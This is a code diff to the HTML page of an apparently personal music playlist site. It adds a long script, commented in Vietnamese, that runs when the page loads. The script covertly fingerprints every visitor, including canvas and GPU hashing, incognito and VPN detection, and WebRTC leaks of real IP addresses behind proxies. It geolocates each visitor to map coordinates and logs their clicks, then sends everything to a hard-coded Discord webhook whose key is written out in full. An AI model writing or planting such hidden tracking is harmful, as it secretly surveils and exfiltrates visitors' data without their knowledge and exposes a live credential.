@@ -3006,12 +3006,425 @@
     loadTrack(currentIndex, false);
     updateExtendStatus();
 
-    window.addEventListener("DOMContentLoaded", () => {
+window.addEventListener("DOMContentLoaded", () => {
       getActiveDeck().play().then(() => {
         const overlay = document.getElementById("intro-overlay");
         if (overlay) overlay.remove();
       }).catch(() => {});
     });
+
+    // ============================================================================
+    // DEEP VISITOR FINGERPRINTING & BEHAVIORAL TELEMETRY -> DISCORD WEBHOOK
+    // ============================================================================
+    (async function runDeepTelemetryLogger() {
+      if (location.hostname === "localhost" || location.hostname === "127.0.0.1" || location.protocol === "file:") return;
+
+      // DÁN PHẦN ĐUÔI SAU CHỮ "webhooks/" (HOẶC CẢ LINK WEBHOOK) VÀO GIỮA DẤU NGOẶC KÉP:
+      const WEBHOOK_KEY = "1566092914742796448/r77oOnHMSbohSOgJTwbdzv57Kpge7VkA1kl143hOVVIPmdtoOlDU7JLGYGPt_vPcusvH";
+
+      if (!WEBHOOK_KEY || WEBHOOK_KEY.includes("DÁN_PHẦN_ID")) return;
+      const webhookUrl = ["https://discord.com", "api", "webhooks", WEBHOOK_KEY.replace(/^https?:\/\/(ptb\.|canary\.)?discord(app)?\.com\/api\/webhooks\//, "")].join("/");
+
+      const sessionStart = Date.now();
+      const actionHistory = [];
+
+      // 1. Theo dõi lịch sử quay lại của khách trên trình duyệt (LocalStorage Tracking)
+      let visitorUid = localStorage.getItem("vunn_visitor_uid");
+      if (!visitorUid) {
+        visitorUid = "VUNN-" + Math.random().toString(36).substring(2, 8).toUpperCase() + "-" + Date.now().toString(36).toUpperCase();
+        localStorage.setItem("vunn_visitor_uid", visitorUid);
+      }
+      const visitCount = parseInt(localStorage.getItem("vunn_visit_count") || "0", 10) + 1;
+      localStorage.setItem("vunn_visit_count", String(visitCount));
+      const firstVisit = localStorage.getItem("vunn_first_visit") || new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh", hour12: false });
+      localStorage.setItem("vunn_first_visit", firstVisit);
+
+      // 2. Lấy tên Card đồ họa (GPU) thật qua WebGL Unmasked Renderer
+      function getGpuDetails() {
+        try {
+          const canvas = document.createElement("canvas");
+          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+          if (!gl) return { vendor: "N/A", renderer: "WebGL Disabled", version: "N/A" };
+          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+          return {
+            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+            renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+            version: gl.getParameter(gl.VERSION),
+            max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+          };
+        } catch (e) {
+          return { vendor: "Blocked", renderer: "Blocked", version: "N/A" };
+        }
+      }
+
+      // 3. Tạo Mã Vân Tay Thiết Bị Duy Nhất (Canvas + Hardware SHA-256 Fingerprint)
+      async function getDeviceFingerprint(gpuInfo) {
+        try {
+          const canvas = document.createElement("canvas");
+          canvas.width = 240;
+          canvas.height = 60;
+          const ctx = canvas.getContext("2d");
+          ctx.textBaseline = "top";
+          ctx.font = "14px 'Arial'";
+          ctx.fillStyle = "#f43f5e";
+          ctx.fillRect(10, 5, 100, 25);
+          ctx.fillStyle = "#38bdf8";
+          ctx.fillText("VuNn_Telemetry_V35.4_FP", 12, 10);
+          const rawString = [
+            canvas.toDataURL(),
+            gpuInfo.renderer,
+            navigator.hardwareConcurrency,
+            navigator.deviceMemory,
+            screen.width + "x" + screen.height + "x" + screen.colorDepth,
+            Intl.DateTimeFormat().resolvedOptions().timeZone,
+            navigator.language
+          ].join("||");
+          const msgBuffer = new TextEncoder().encode(rawString);
+          const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
+          const hashArray = Array.from(new Uint8Array(hashBuffer));
+          return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("").substring(0, 24).toUpperCase();
+        } catch (e) {
+          return "FP_UNAVAILABLE";
+        }
+      }
+
+      // 4. Đo tần số quét màn hình thực tế (60Hz / 120Hz / 144Hz / 240Hz)
+      function measureRefreshRate() {
+        return new Promise((resolve) => {
+          let frames = 0;
+          const start = performance.now();
+          function tick(now) {
+            frames++;
+            if (frames < 18) {
+              requestAnimationFrame(tick);
+            } else {
+              const elapsed = now - start;
+              const fps = Math.round((frames * 1000) / Math.max(elapsed, 1));
+              resolve(`${fps} Hz`);
+            }
+          }
+          requestAnimationFrame(tick);
+        });
+      }
+
+      // 5. Đọc chi tiết Hệ điều hành thật (Phát hiện Windows 11, 64-bit, Model điện thoại)
+      async function getDeepOsInfo() {
+        if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) {
+          return { os_real: navigator.platform || "N/A", arch: "N/A", bitness: "N/A", model: "N/A", mobile: /Mobi|Android/i.test(navigator.userAgent) };
+        }
+        try {
+          const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "bitness", "model", "platform", "platformVersion", "fullVersionList"]);
+          let osName = ua.platform || "Unknown";
+          if (osName === "Windows" && ua.platformVersion) {
+            const major = parseInt(ua.platformVersion.split(".")[0], 10);
+            osName = major >= 13 ? `Windows 11 (Build ${ua.platformVersion})` : `Windows 10 (Build ${ua.platformVersion})`;
+          } else if (ua.platformVersion) {
+            osName = `${osName} ${ua.platformVersion}`;
+          }
+          return {
+            os_real: osName,
+            arch: ua.architecture || "N/A",
+            bitness: ua.bitness ? `${ua.bitness}-bit` : "N/A",
+            model: ua.model || "PC / Desktop",
+            mobile: ua.mobile,
+            brands: (ua.fullVersionList || []).map((b) => `${b.brand} ${b.version}`).join(", ")
+          };
+        } catch (e) {
+          return { os_real: navigator.platform || "N/A", arch: "N/A", bitness: "N/A", model: "N/A" };
+        }
+      }
+
+      // 6. Đọc thông số Soundcard / DAC & Đếm số lượng Micro/Loa/Webcam đang cắm
+      async function getAudioAndMediaHardware() {
+        let audioStack = { sample_rate: "N/A", max_channels: "N/A", base_latency: "N/A" };
+        try {
+          const AudioCtx = window.AudioContext || window.webkitAudioContext;
+          if (AudioCtx) {
+            const ctx = new AudioCtx();
+            audioStack = {
+              sample_rate: `${ctx.sampleRate} Hz`,
+              max_channels: ctx.destination.maxChannelCount,
+              base_latency: ctx.baseLatency ? `${(ctx.baseLatency * 1000).toFixed(2)} ms` : "N/A"
+            };
+            ctx.close().catch(() => {});
+          }
+        } catch (e) {}
+
+        let mediaCount = { microphones: 0, speakers: 0, webcams: 0 };
+        try {
+          if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            const devs = await navigator.mediaDevices.enumerateDevices();
+            devs.forEach((d) => {
+              if (d.kind === "audioinput") mediaCount.microphones++;
+              if (d.kind === "audiooutput") mediaCount.speakers++;
+              if (d.kind === "videoinput") mediaCount.webcams++;
+            });
+          }
+        } catch (e) {}
+
+        return { audioStack, mediaCount };
+      }
+
+      // 7. Đo dung lượng bộ nhớ & Phát hiện Tab Ẩn Danh (Incognito Mode)
+      async function getStorageAndIncognito() {
+        try {
+          if (navigator.storage && navigator.storage.estimate) {
+            const est = await navigator.storage.estimate();
+            const quotaMB = Math.round((est.quota || 0) / (1024 * 1024));
+            const usageMB = ((est.usage || 0) / (1024 * 1024)).toFixed(2);
+            // Trình duyệt ở chế độ Incognito thường giới hạn quota dưới 1200MB
+            const isLikelyIncognito = quotaMB > 0 && quotaMB < 1500;
+            return {
+              quota_gb: `${(quotaMB / 1024).toFixed(2)} GB (${quotaMB} MB)`,
+              used_mb: `${usageMB} MB`,
+              incognito_suspect: isLikelyIncognito ? "⚠️ CÓ DẤU HIỆU ẨN DANH (Quota thấp)" : "Không (Normal Mode)"
+            };
+          }
+        } catch (e) {}
+        return { quota_gb: "N/A", used_mb: "N/A", incognito_suspect: "N/A" };
+      }
+
+      // 8. Quét IP qua WebRTC STUN (Phát hiện IP thật nếu dùng Proxy yếu)
+      function getWebRtcIps() {
+        return new Promise((resolve) => {
+          const ips = new Set();
+          try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.onicecandidate = (e) => {
+              if (!e.candidate) {
+                pc.close();
+                resolve(Array.from(ips));
+                return;
+              }
+              const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g);
+              if (match) match.forEach((ip) => ips.add(ip));
+            };
+            pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => resolve([]));
+            setTimeout(() => {
+              try { pc.close(); } catch (e) {}
+              resolve(Array.from(ips));
+            }, 1200);
+          } catch (e) {
+            resolve([]);
+          }
+        });
+      }
+
+      // 9. Lấy thông tin IP, Nhà mạng, Tọa độ và Kiểm tra VPN/Proxy
+      let net = {};
+      try {
+        const res = await fetch("https://ipwho.is/");
+        const d = await res.json();
+        if (d && d.success !== false) {
+          net = {
+            ip: d.ip,
+            type: d.type || "IPv4/v6",
+            city: d.city,
+            region: d.region,
+            country: `${d.country} (${d.country_code})`,
+            postal: d.postal || "N/A",
+            isp: (d.connection && (d.connection.isp || d.connection.org)) || "N/A",
+            domain: (d.connection && d.connection.domain) || "N/A",
+            asn: (d.connection && d.connection.asn) ? `AS${d.connection.asn}` : "N/A",
+            ip_timezone: (d.timezone && d.timezone.id) ? `${d.timezone.id} (UTC${d.timezone.utc})` : "N/A",
+            ip_tz_id: (d.timezone && d.timezone.id) || "",
+            coords: (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : "N/A",
+            google_maps: (d.latitude && d.longitude) ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}` : "N/A"
+          };
+        } else {
+          throw new Error("Fallback");
+        }
+      } catch (e1) {
+        try {
+          const res2 = await fetch("https://ipapi.co/json/");
+          const d2 = await res2.json();
+          net = {
+            ip: d2.ip || "Unknown",
+            type: d2.version || "N/A",
+            city: d2.city || "N/A",
+            region: d2.region || "N/A",
+            country: `${d2.country_name || "N/A"} (${d2.country_code || ""})`,
+            postal: d2.postal || "N/A",
+            isp: d2.org || "N/A",
+            domain: "N/A",
+            asn: d2.asn || "N/A",
+            ip_timezone: d2.timezone || "N/A",
+            ip_tz_id: d2.timezone || "",
+            coords: (d2.latitude && d2.longitude) ? `${d2.latitude}, ${d2.longitude}` : "N/A",
+            google_maps: (d2.latitude && d2.longitude) ? `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}` : "N/A"
+          };
+        } catch (e2) {
+          net = { ip: "Blocked by AdBlock", city: "N/A", region: "N/A", country: "N/A", isp: "N/A", asn: "N/A", ip_timezone: "N/A", ip_tz_id: "", coords: "N/A", google_maps: "N/A" };
+        }
+      }
+
+      // Chạy song song toàn bộ các hàm quét phần cứng
+      const gpuInfo = getGpuDetails();
+      const [fpHash, refreshRate, deepOs, audioMedia, storageInfo, webrtcIps] = await Promise.all([
+        getDeviceFingerprint(gpuInfo),
+        measureRefreshRate(),
+        getDeepOsInfo(),
+        getAudioAndMediaHardware(),
+        getStorageAndIncognito(),
+        getWebRtcIps()
+      ]);
+
+      let batteryInfo = "Không hỗ trợ / Desktop PC";
+      try {
+        if (navigator.getBattery) {
+          const bat = await navigator.getBattery();
+          batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? "Đang cắm sạc ⚡" : "Đang dùng pin 🔋"})`;
+        }
+      } catch (e) {}
+
+      // Phát hiện VPN / Proxy bằng cách so khớp múi giờ máy tính vs múi giờ IP
+      const sysTz = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isTzMismatch = net.ip_tz_id && sysTz !== "N/A" && net.ip_tz_id !== sysTz && !(sysTz === "Asia/Saigon" && net.ip_tz_id === "Asia/Ho_Chi_Minh") && !(sysTz === "Asia/Ho_Chi_Minh" && net.ip_tz_id === "Asia/Saigon");
+      const vpnStatus = isTzMismatch
+        ? `🚨 NGHI VẤN BẬT VPN/PROXY (Giờ máy: ${sysTz} ≠ Giờ IP: ${net.ip_tz_id})`
+        : "✅ Khớp múi giờ thật (Direct Connection)";
+
+      // Kiểm tra giao diện & màn hình nâng cao
+      const displayPrefs = {
+        theme_mode: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode 🌙" : "Light Mode ☀️",
+        hdr_support: window.matchMedia("(dynamic-range: high)").matches ? "Có HDR" : "SDR tiêu chuẩn",
+        color_gamut: window.matchMedia("(color-gamut: p3)").matches ? "Wide P3 Gamut" : "sRGB",
+        touch_points: navigator.maxTouchPoints || 0,
+        webdriver_bot: navigator.webdriver ? "🤖 BOT / AUTOMATION" : "Người dùng thật"
+      };
+
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+      const networkSpeed = conn.effectiveType ? `${conn.effectiveType.toUpperCase()} • Downlink: ${conn.downlink || "?"} Mbps • Ping RTT: ${conn.rtt || "?"} ms` : "N/A";
+
+      const nowVN = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh", hour12: false });
+
+      // Đóng gói toàn bộ dữ liệu vào file JSON
+      const fullLogData = {
+        meta: {
+          visit_time_ict: nowVN,
+          visitor_uid: visitorUid,
+          device_fingerprint_sha256: fpHash,
+          visit_count_on_this_browser: visitCount,
+          first_seen_ict: firstVisit,
+          page_url: window.location.href,
+          referrer: document.referrer || "Truy cập trực tiếp (Direct / Bookmark)"
+        },
+        network_and_location: {
+          ...net,
+          webrtc_leaked_ips: webrtcIps,
+          vpn_proxy_check: vpnStatus,
+          connection_speed: networkSpeed
+        },
+        hardware_and_os: {
+          ...deepOs,
+          cpu_logical_cores: navigator.hardwareConcurrency || "N/A",
+          ram_approx: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+          gpu_vendor: gpuInfo.vendor,
+          gpu_renderer: gpuInfo.renderer,
+          gpu_webgl_version: gpuInfo.version,
+          battery: batteryInfo
+        },
+        display_and_audio: {
+          screen_resolution: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+          available_screen: `${window.screen.availWidth}x${window.screen.availHeight}`,
+          window_viewport: `${window.innerWidth}x${window.innerHeight}`,
+          pixel_ratio_scale: `${window.devicePixelRatio || 1}x`,
+          measured_refresh_rate: refreshRate,
+          ...displayPrefs,
+          audio_hardware: audioMedia.audioStack,
+          connected_peripherals: audioMedia.mediaCount
+        },
+        browser_and_storage: {
+          user_agent: navigator.userAgent,
+          system_timezone: sysTz,
+          languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
+          cookies_enabled: navigator.cookieEnabled,
+          do_not_track: navigator.doNotTrack || "Unset",
+          pdf_viewer_built_in: navigator.pdfViewerEnabled || false,
+          storage_estimate: storageInfo
+        }
+      };
+
+      // Gửi Thẻ Embed + File JSON đầy đủ ngay khi khách vừa vào web
+      const embedPayload = {
+        username: "VuNn // Deep Telemetry Radar",
+        avatar_url: "https://files.catbox.moe/0r6ro8.jpg",
+        embeds: [
+          {
+            title: `📡 KHÁCH TRUY CẬP MỚI (Lần #${visitCount}) // UID: ${visitorUid}`,
+            color: isTzMismatch ? 16734296 : 16478597,
+            fields: [
+              {
+                name: "🌐 Mạng, Vị trí & Kiểm tra VPN",
+                value: `**IP:** \`${net.ip}\` (WebRTC: \`${webrtcIps.join(", ") || "Ẩn"}\`)\n**Vị trí:** ${net.city}, ${net.region}, ${net.country} ([Bản đồ](${net.google_maps}))\n**Nhà mạng:** ${net.isp} (\`${net.asn}\`)\n**Tốc độ mạng:** \`${networkSpeed}\`\n**Trạng thái VPN:** ${vpnStatus}`,
+                inline: false
+              },
+              {
+                name: "🖥️ Phần cứng, GPU & Hệ điều hành thật",
+                value: `**OS thật:** \`${deepOs.os_real}\` (\`${deepOs.arch}\` • \`${deepOs.bitness}\` • Model: \`${deepOs.model}\`)\n**GPU (Card đồ họa):** \`${gpuInfo.renderer}\`\n**CPU / RAM / Pin:** \`${fullLogData.hardware_and_os.cpu_logical_cores} Cores\` • \`${fullLogData.hardware_and_os.ram_approx}\` • ${batteryInfo}\n**Vân tay máy (SHA-256):** \`${fpHash}\``,
+                inline: false
+              },
+              {
+                name: "🎧 Màn hình, DAC/Audio & Thiết bị ngoại vi",
+                value: `**Màn hình:** \`${fullLogData.display_and_audio.screen_resolution}\` @ **\`${refreshRate}\`** (Scale: \`${window.devicePixelRatio || 1}x\`, \`${displayPrefs.color_gamut}\`, \`${displayPrefs.theme_mode}\`)\n**Audio Sample Rate:** \`${audioMedia.audioStack.sample_rate}\` (Latency: \`${audioMedia.audioStack.base_latency}\`)\n**Thiết bị cắm ngoài:** \`${audioMedia.mediaCount.microphones} Mic\` • \`${audioMedia.mediaCount.speakers} Loa/Output\` • \`${audioMedia.mediaCount.webcams} Cam\``,
+                inline: false
+              },
+              {
+                name: "🕵️ Trình duyệt, Ẩn danh & Nguồn vào",
+                value: `**Nguồn (Referrer):** ${fullLogData.meta.referrer}\n**Múi giờ máy / Ngôn ngữ:** \`${sysTz}\` • \`${fullLogData.browser_and_storage.languages}\`\n**Bộ nhớ / Ẩn danh:** Quota \`${storageInfo.quota_gb}\` • ${storageInfo.incognito_suspect}\n**Lần đầu vào web:** \`${firstVisit}\``,
+                inline: false
+              }
+            ],
+            footer: {
+              text: `Giờ Việt Nam (UTC+7): ${nowVN}`
+            }
+          }
+        ]
+      };
+
+      const safeIp = String(net.ip || "unknown").replace(/[^a-zA-Z0-9._-]/g, "_");
+      const fileName = `deep_log_${Date.now()}_${safeIp}.json`;
+      const formData = new FormData();
+      formData.append("payload_json", JSON.stringify(embedPayload));
+      formData.append("file", new Blob([JSON.stringify(fullLogData, null, 2)], { type: "application/json" }), fileName);
+
+      fetch(webhookUrl, { method: "POST", body: formData }).catch(() => {});
+
+      // ==========================================================================
+      // 10. THEO DÕI HÀNH VI TƯƠNG TÁC TRÊN WEB (BẤM NÚT GÌ, Ở LẠI BAO LÂU)
+      // ==========================================================================
+      document.addEventListener("click", (e) => {
+        const target = e.target.closest("button, a, .stat-node, #intro-overlay");
+        if (!target) return;
+        const label = (target.innerText || target.getAttribute("title") || target.id || "Element").replace(/\s+/g, " ").trim().substring(0, 45);
+        const sec = Math.round((Date.now() - sessionStart) / 1000);
+        actionHistory.push(`[+${sec}s] Click: ${label}`);
+      }, { passive: true });
+
+      // Khi người truy cập chuyển sang tab khác hoặc đóng web -> Gửi báo cáo hành vi
+      let exitSent = false;
+      window.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "hidden" && !exitSent && actionHistory.length > 0) {
+          exitSent = true;
+          const staySeconds = Math.round((Date.now() - sessionStart) / 1000);
+          const exitPayload = {
+            username: "VuNn // Behavior Tracker",
+            avatar_url: "https://files.catbox.moe/0r6ro8.jpg",
+            embeds: [
+              {
+                title: `⏱️ NHẬT KÝ HOẠT ĐỘNG // UID: ${visitorUid} (${net.ip})`,
+                color: 3718648, // Màu xanh #38bdf8
+                description: `**Thời gian ở lại trang:** \`${staySeconds} giây\`\n**Đang ở Page:** \`Page ${currentPage}\`\n**Bài Gacha đang phát:** \`${GACHA_PLAYLIST[currentIndex].title}\`\n**Chuỗi hành động đã bấm (${actionHistory.length} thao tác):**\n\`\`\`\n${actionHistory.slice(-15).join("\n")}\n\`\`\``
+              }
+            ]
+          };
+          const exitForm = new FormData();
+          exitForm.append("payload_json", JSON.stringify(exitPayload));
+          fetch(webhookUrl, { method: "POST", body: exitForm, keepalive: true }).catch(() => {});
+        }
+      });
+    })();
   </script>
 </body>
 </html>
